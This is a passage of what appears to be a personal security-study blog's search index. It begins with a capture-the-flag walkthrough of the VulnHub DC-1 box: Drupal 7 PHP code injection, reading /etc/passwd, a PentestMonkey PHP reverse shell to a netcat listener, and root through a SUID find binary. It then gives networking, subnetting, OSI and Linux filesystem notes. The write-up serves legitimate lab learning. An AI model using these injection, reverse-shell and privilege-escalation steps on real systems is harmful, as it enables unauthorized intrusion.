\u003c?php system(\"whoami\"); ?\u003e Change “Text Format” to the PHP code module, which is what we enabled with admin privs Then press preview… let’s see if we can grab the current user… We got a response! “www-data”. Injection is working! DC-1 Drupal 7 PHP code injection! Let’s change the command from whoami to cat /etc/passwd. Looks like another two users to notate. www-data and flag4 C-1 Drupal 7 PHP code injection - passwd file Trying sudo cat /etc/shadow fails, so we don’t have sudo or root privs. Sudo may not even be installed ","date":"01-20-2023","objectID":"/dc-1/:4:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"PHP revshell Now it’s time to get ourselves a revshell through php injection… let’s insert the following php code from this raw github file… PentestMonkey’s PHP revshell You’ll want to modify the following lines of code to match up with your nc -nvlp 1234 command. The PHP code will callback to netcat and allow us to connect via a shell on the DC-1 box. You can change the ports to whatever you’d like. $ip = ‘192.168.56.1’; // CHANGE THIS $port = 1234; // CHANGE THIS Now open up another terminal with the nc -nvlp 1234, I mentioned before. You should now have both: terminal with nc -nvlp 1234 running. Drupal Basic Page filled in with PentestMonkey’s reverse php shell Let’s hit preview and we should get a revshell as www-data. If we do, we’ll move onto privilege escalation. The Drupal page will likely hang, let it be. Minimize it and forget about it. If you refresh or close it, you’ll lose your revshell. We now have a revshell into the box but lacks tty! We’ll fix this in the next section. Let’s do a quick test by typing whoami into our new revshell. You should see “www-data”. DC-1 Drupal 7 - revshell w/o tty ","date":"01-20-2023","objectID":"/dc-1/:4:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Privilege Escalation At this point, we now have a revshell into DC-1 whom does not have root privs. We’ll need to find a way to escalate the privs, so we can ‘own’ the box! ","date":"01-20-2023","objectID":"/dc-1/:5:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Custom tty First thing I like to do is get a tty and make our local terminal not break connection even if you press CTRL+C. python -c 'import pty; pty.spawn(\"/bin/bash\")' export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp export TERM=xterm-256color alias ll='ls -lsaht --color=auto' Press Ctrl + Z to make it a background process stty raw -echo;fg;reset stty columns 200 rows 200 Now that you have a tty shell, with alias ll, and you can’t CTRL+C out of it on accident.. Let’s get to privesc(privilege escalation) but before that let’s update our ’notes’ Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22 - Drupal CMS v7.24 - php 5.4.45-0+deb7u14 - mysql version? Drupal -\u003e Admin acct created owned:owned with Drupal 7.x SQLi exploit -\u003e enabled php-code and created basic content to inject php-revshell giving us low-level shell. -\u003e shifted into a tty that doesn’t allow CTRL+C disconnects -\u003e now time to dig into privesc 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys Found Users: Fred ; admin ; www-data ; flag4 At this point, we want to look through the box and enumerate anything we can find. For time sake, we’ll skip most of this. We could transfer linpeas.sh to enumerate the system for us, but let’s try without it. I like to look for binaries that have SUID or GUID perms. These SUIDs and GUIDs are binaries that have a perm set to s in the user or group column. What makes these binaries so attractive is that they are executed with the owner’s privs(think root 😃) but can be accessible and executable by lower priv users/groups. Once we produce a list of SUID/GUID binaries, we can check them against GTFObins ","date":"01-20-2023","objectID":"/dc-1/:5:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"SUID Search Let’s look for SUID binaries! find / -perm -u=s -type f 2\u003e/dev/null DC-1 Drupal 7 - SUID search Here’s the find binary. Look at the perms. You’re looking for an s in place of the executable bit set for user group. DC-1 Drupal 7 - SUID example ","date":"01-20-2023","objectID":"/dc-1/:5:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Searching GTFObins Let’s look on GTFObins to see if any of these binaries have a SUID exploit that obtains and holds elevated privs. - /bin/mount - only has Sudo which isn’t installed on the box. So, pass. - /bin/ping - no SUID abuse - /bin/su - no SUID abuse - /bin/ping6 - isn’t listed - /bin/umount - isn’t listed - /usr/bin/at - no SUID abuse - /usr/bin/chsh - isn’t listed - /usr/bin/passwd - isn’t listed - /usr/bin/newgrp - isn’t listed - /usr/bin/chfn - isn’t listed - /usr/bin/gpasswd - isn’t listed - /usr/bin/procmail - isn’t listed - /usr/bin/find - WE HAVE A HIT! SUID bit can be abused! - command will be /usr/bin/find -exec /bin/sh \\; -quit ","date":"01-20-2023","objectID":"/dc-1/:5:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Abusing the SUID Copy/paste /usr/bin/find -exec /bin/sh \\; -quit in the tty remote shell you have running in your terminal and let’s see if we can abuse the SUID bit to escalate privs to root… $$$ - We have root! ","date":"01-20-2023","objectID":"/dc-1/:5:4","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"ROOTED! DC-1 Drupal 7 - ROOTED!!! ","date":"01-20-2023","objectID":"/dc-1/:6:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["Computer Networks"],"content":"Basics of Networking A network is two or more hosts connected together in order to exchange data. There’s two network types: WAN (Wide Area Network) - network that connects large geographical areas. LAN (Local Area Network) - network that is confined within a WAN network. These networks use the OSI Layers to exchange data. ","date":"12-20-2022","objectID":"/networking/:1:0","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"IP addresses - Part 1/2 of TCP/IP network config (Layer 3) IP Addressing provides two functions: Identifies a device’s network interface on a network. Gives a network device a network location to enable communications. Network and Host IDs An IP address is a binary number which is normally shown as a 32-bit decimal number divided, by decimals, into four separate 8-bit sections(octets). This number represents two logical sections that determine the network ID and host ID.(more details in subnet section) Network ID provides the subnet a unique number and specifies the network class(A, B, or C). Host ID gets assigned to the network device and uniquely identifies the host. Example: 192.168.1.1 /24(255.255.255.0) Network ID = 192.168.1 \u003c– The first three octets specify the subnet’s network ID and never changes. This tells the router which subnet to route the packet to. Host ID = 0.0.0.1 \u003c– The last octet is used for assigning IP addresses to host network devices. This tells the router which host, inside the network ID subnet, to route the packet to. IP Address Assignment IP addresses are assigned in two different ways: Dynamic - The DHCP(Dynamic Host Configuration Protocol) server will assign an IP address to a network device based on the MAC address of the network interface. Static - DHCP server isn’t involved meaning the device network interface must assign its own IP address, MAC address, and Gateway address to a fixed value. ","date":"12-20-2022","objectID":"/networking/:1:1","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"Subnets As a network grows, it can start to become unmanageable resulting it unwanted effects like the lack of IP addresses and poor security, organization, and performance. A solution to this is to split up the larger network into smaller networks aka subnetting. A subnet, or sub-network, is simply a network sitting inside another network defined by a different IP address(network ID). When you increase the number of subnets you decrease the number of hosts per subnet. Separating the network improves: Security - by isolation. Performance - by reducing the amount of broadcasts and avoiding routers. Administration - by separating critical network devices and creating redundancies. Traffic going from one subnet to another subnet needs routed(router / gateway). ","date":"12-20-2022","objectID":"/networking/:1:2","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"Subnet masks - Part 2/2 of TCP/IP network config (Layer 3) Subnet masks are used, in TCP/IP, to specify if the network interface is within the same local subnet or within another subnet. Subnet masks are also 32-bit numbers and tell us which part of the IP address represents the Network ID and which part represents the Host ID range. When looking at a binary subnet mask, the binary 1’s represent Network ID and the binary 0’s represent Host ID range. /24 = 255.255.255.0 = CIDR tells you, from left to right, how many 1’s the subnet mask has enabled 255.255.255.0(is a decimal representation of the following binary number = 11111111.11111111.11111111.00000000) 11111111.11111111.11111111.00000000 = this is /24 in binary. From left to right, you’ll see that 24 1’s are enabled. In each octet section, you can have a maximum of 256 addresses. From left to right, each binary represents this number = 128 - 64 - 32 - 16 - 8 - 4 - 2 - 1 . Add those up and you’ll get 256. This explanation of CIDR to decimal to binary also applies to IP addresses. ","date":"12-20-2022","objectID":"/networking/:1:3","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"IP Addressing Example Simple break down of an IP Address Line up the binaries for the IP address and subnet mask IP Address = 192.168.123.132, Subnet = /24(CIDR) aka 255.255.255.0 11000000.10101000.01111011.10000100 = Binary representation of IP address 192.168.123.132 11111111.11111111.11111111.00000000 = Binary representation of subnet 255.255.255.0. 1’s equal Network ID \u0026 0’s equal Host ID range. Look at the first octet section of the subnet mask(starting from the left side). Where we see a 1, we need to carry over the IP address’s matching binary value to start building the Network ID. So overall, we need to carry over each binary value of the first three octets of the IP address to the Network ID since the subnet mask binaries are all 1’s in those first three octets. When we get to the binary 0’s, of the subnet mask, we then copy the matching IP address binary value over to the Host ID. We get the following: 11000000.10101000.01111011.00000000 - 192.168.123 Network ID 00000000.00000000.00000000.10000100 - 0.0.0.132 Host ID ","date":"12-20-2022","objectID":"/networking/:1:4","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"Subnetting Example Finding the Host ID range, Network ID, and Broadcast IP from only knowing one IP address and it’s subnet mask Let’s drag down the same IP address from above but change the subnet mask, then work off that. 11111111.11111111.11111111.11|000000 = Subnet mask = /26 = 255.255.255.192 11000000.10101000.01111011.10|000100 = IP Address within the subnet = 192.168.123.132 Again, the subnet mask tells us which bits, in the IP address, are used for the network ID and which are used for the host ID range. Any enabled bit on the left side of the | is for the network ID. This | sits just to the right of the last enabled bit within the subnet mask. Network ID binaries do not change. Any disabled bit on the right side of the | is for the host IP range. 11000000.10101000.01111011.10|000000 = network ID in bold = 192.168.123.128 11000000.10101000.01111011.10|000000 through 11000000.10101000.01111011.10|111111 = host ID range in bold = 192.168.123.128 through 192.168.123.191 Out of the host ID range we get three values: Network ID(lowest number of the Host IP range) = 192.168.123.128 Usable Host range = 192.168.123.129 through 192.168.123.190 This gives us 62 IP addresses to assign to hosts within the 192.168.123 subnet. Broadcast ID(highest number of the Host IP range) = 192.168.123.191 ","date":"12-20-2022","objectID":"/networking/:1:5","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"TCP vs UDP (Layer 4) TCP = Transmission Control Protocol Reliable Connection oriented - 3-way handshake SYN \u003e SYN ACK \u003e ACK. Considered reliable since it only sends data once a connection is established. Packets delivered in the same order sent and resent as needed. Dynamically manages congestion Much slower than UDP(higher latency and slower throughput). Uses more resources since more calculations are made. Data taken apart \u003e sent \u003e reconstructed. UDP = User Datagram Protocol Unreliable Connectionless oriented - No handshake Faster than TCP(Low latency with loss-tolerance and faster throughput) Used by real-time apps(video, audio, etc) Error packets are discarded ","date":"12-20-2022","objectID":"/networking/:1:6","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"Common Ports and Protocols TCP FTP (21) SSH (22) Telnet (23) SMTP (25) DNS (53) HTTP (80, 8080) Kerberos (88) POP3 (110) RpcBind (111) NNTP (119) NTP (123) RPC (135) SMB (139 + 455) IMAP (143) IRC (194) HTTPS (443, 8443) UDP DNS (53) DHCP (67,68) TFTP (69) SNMP (161, 162) ","date":"12-20-2022","objectID":"/networking/:1:7","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"DNS (Layer 7) Domain Name System DNS’s main task is to associate domain names with their decimal IP addresses. Domain Names help identify services that reside on the internet, like websites. The most common way people interact with DNS is through their browser. Let’s start by opening a terminal window and run the following: nslookup google.com If you look down in the “Non-authoritative answer:” section, you’ll see the “Name: google.com” along with the IP address given to us by a DNS server. In my case, it’s “Address: 142.250.191.142” Without DNS, when you type google.com, into a browser, IP protocols wouldn’t know what to do with that as it’s not a decimal IP address. So to make our lives easier, a DNS server resolves an IP address to connect to and the browser just presents it as “google.com”. If you take the google.com associated IP address, in your nslookup command output, and enter that into a browser’s address bar, it’ll go to google.com without an issue. If you ever find yourself having issues resolving a website but you can ping another system… broken DNS may be the cause. DNS is a meme these days since you’ll hear people joke about “Did you check DNS” as it’s a common issue in IT. ","date":"12-20-2022","objectID":"/networking/:1:8","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"OSI Layers \u0026 PDU OSI Model is a 7 abstract layer table that’s responsible for explaining the flow of data within a network. Experienced individuals will often call out an issue by the culprit layer number. example: “This is a level 3 issue.” Protocol data unit(PDU) is a name given to the data when passing through each OSI layer. Bits, Frames, etc. ","date":"12-20-2022","objectID":"/osi-model/:1:0","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Physical - Layer 1 - Bits (PDU) Bit-by-bit delivery, modulation, start-stop signals, physical network. Anything to do with physical transmission of data. From transmission mode(full, half duplex) to pinout of a ethernet connector. Some related devices: Ethernet hub, repeater, and physical transmission medium(wire, plug, outlet). ","date":"12-20-2022","objectID":"/osi-model/:1:1","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Data link - Layer 2 - Frames (PDU) Encapsulation, frame sync, LLC, and MAC address. Provides a link between two devices, via a physical layer, and provides flow control. It also detects and corrects errors on layer 1. Defines two sublayers: Media Access Control(MAC) - controls device access and grants permissions for data transit. Logical link control(LLC) - flow control, handles network layer protocols and error checking/frame sync. Some related devices: Switch, bridge, NIC. ","date":"12-20-2022","objectID":"/osi-model/:1:2","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Network - Layer 3 - Packets (PDU) Controls addressing, routing, and traffic control. This layer routes packets between two network nodes by providing cross-network addressing, routing, and updates both routing tables \u0026 fragmented packets. ","date":"12-20-2022","objectID":"/osi-model/:1:3","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Transport - Layer 4 - Segments \u0026 Datagrams (PDU) Reliability, flow control, connection-oriented communications, and multiplexing. Layer 4 is responsible for segmenting data and relieving congestion by determining the protocol to be used(TCP and UDP, or others), size of window(packet size(MTU)), and order of transmission. ","date":"12-20-2022","objectID":"/osi-model/:1:4","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Session - Layer 5 - Data (PDU) Session management(build and control sessions) between two hosts. Authentication, Authorization, Session restoration. This layer opens, manages, and closes sessions between end-user application processes. API, sockets, and WinSock. ","date":"12-20-2022","objectID":"/osi-model/:1:5","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Presentation - Layer 6 - Data (PDU) Translation –\u003e data (de)compression –\u003e data (de)encryption. This layer converts data (MOV, JPEG, ASCII, etc) to and from the form that the application layer accepts, so it can be sent over the network. ","date":"12-20-2022","objectID":"/osi-model/:1:6","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Application - Layer 7 - Data (PDU) Communication protocol and interface methods, used by host processes, to enable network communications. In other words, applications handling data through specific protocols which then is sent through layer 6. This would include HTTP(S), IMAP, POP3, SMTP, FTP, SSH, etc. Also provides service advertisement on the network. ","date":"12-20-2022","objectID":"/osi-model/:1:7","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Detailed Table of OSI \u0026 TCP/IP Mnemonic OSI TCP/IP PDU Devices IP Suite Functions 7. ALL Application Application Data Gateways, Load Balancers, Firewalls, End-point devices HTTP(s), DNS, DHCP, IRC, FTP, TFTP, Telnet, SSH, SMTP, POP, IMAP, NTP, SNMP, TLS/SSL, BGP, RIP, SIP, MIME, and others - Applications handle data through specific protocols to present data to user and layer 6. - Provides service advertisement on the network. 6. PEOPLE Presentation AFP, ICA, LPP, NCP, NDR, TOX, XDR, PAD - Formats, converts, (de/en)crypts, (de)compresses data (MOV, JPEG, ASCII, etc) to and from the form that the application layer accepts, so it can be sent over the network. 5. SEEM Session ASP, ADSP, H.245, NetBIOS, RPC, SCP, ZIP, SDP, SOCKS, SMPP, and others - Session management (build and control sessions) between two hosts. - Authentication, authorization, session restoration. - This layer opens, manages, and closes sessions between end-user application processes. 4. TO Transport Transport Segments Gateways, Load Balancers, Firewalls TCP, UDP, and others - Reliability, flow control, connection-oriented communications, and multiplexing. - Segments data and relieves congestion by determining the protocol to be used (TCP and UDP, or others), size of window (packet size(MTU)), and order of transmission. 3. NEED Network Internet Packets (Datagrams) Routers, VPN devices, Multilayer(L3) Switch, WAPs IPv4, IPv6, ICMP, ICMPv6, IPSec, OSPF, EIGRP, and others - Controls addressing, routing, and traffic control. - Routes packets between two network nodes by providing cross-network addressing, routing, and updates both routing tables \u0026 fragmented packets. 2. DATA Data Link Network Access Frames Switches, Bridges, NICs, WAPs, Modems ARP, Ethernet, CDP, LLDP, HDLC, PPP, DSL, L2TP, 802.11, STP, and others - Encapsulation, frame sync, LLC, and MAC address. - Provides a link between two devices, via a physical layer, and provides flow control. - It also detects and corrects errors on layer 1. - Defines both MAC and LLC sublayers. 1. PROCESSING Physical Bits Hubs, NICs, Repeaters, Cables, Antennas, Modems, Wireless - Bit-by-bit delivery, modulation, start-stop signals, physical network. - Anything to do with physical transmission of data. ","date":"12-20-2022","objectID":"/osi-model/:2:0","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Linux"],"content":"/ Root - Where it begins Linux uses a tree oriented hierarchy, meaning it starts at one point and branches outward. This starting point is the / (system root) directory. This particular hierarchy layout is based on the FHS (Filesystem Hierarchy Standard). ","date":"12-05-2022","objectID":"/linuxfilehierarchy/:1:0","tags":["Linux File Structure","Linux File Hierarchy","Everything is a file"],"title":"Linux File Hierarchy","uri":"/linuxfilehierarchy/"},{"categories":["Linux"],"content":"FHS - (Filesystem Hierarchy Standard) Maintained by the Linux Foundation and last updated on June 3rd, 2015 (as of 12-16-22). FHS provides UNIX-like operating systems with a set of file and directory requirements and guidelines. ","date":"12-05-2022","objectID":"/linuxfilehierarchy/:2:0","tags":["Linux File Structure","Linux File Hierarchy","Everything is a file"],"title":"Linux File Hierarchy","uri":"/linuxfilehierarchy/"},{"categories":["Linux"],"content":"Common directories that sit under / (system root). /bin - Essential command binaries used by the user and system. /boot - Stores data required for system boot. /dev - Files that represent devices attached to the system. /etc - Static configuration files (not binaries) for the system. /home - Location for individual files of particular user. /lib - Essential shared libraries and kernel modules (drivers). /media - Mount point for removable media. /mnt - Mount point for mounting a filesystem temporarily. /opt - Add-on application software packages. /root - Home directory for the root user.. /run - Data relevant to running processes since boot /sbin - Essential system binaries. /srv - Data for services provided by this system. /tmp - Temporary files (reboot usually clears this directory). /usr - Second major hierarchy (binaries and data). /bin - Most executable commands. /include - Header files for compiling programs written in C. /lib - More libraries and data files. /local - User installed software. /sbin - Non-Essential binaries for sysadmin. /share - Hierarchy for read-only architecture independent data files. /var - Hierarchy for variable data to sit in (logs, cache, software states). /cache - Cache data from applications. /lib - Variable state information for applications and system. /local - Variable data for /usr/local. /lock - Lock files. /log - Log files and directories. /opt - Variable data for /opt. /run - Runtime variables. /spool - Application spool (queued) data. /tmp - Temporary files preserved between system reboots. ","date":"12-05-2022","objectID":"/linuxfilehierarchy/:2:1","tags":["Linux File Structure","Linux File Hierarchy","Everything is a file"],"title":"Linux File Hierarchy","uri":"/linuxfilehierarchy/"}]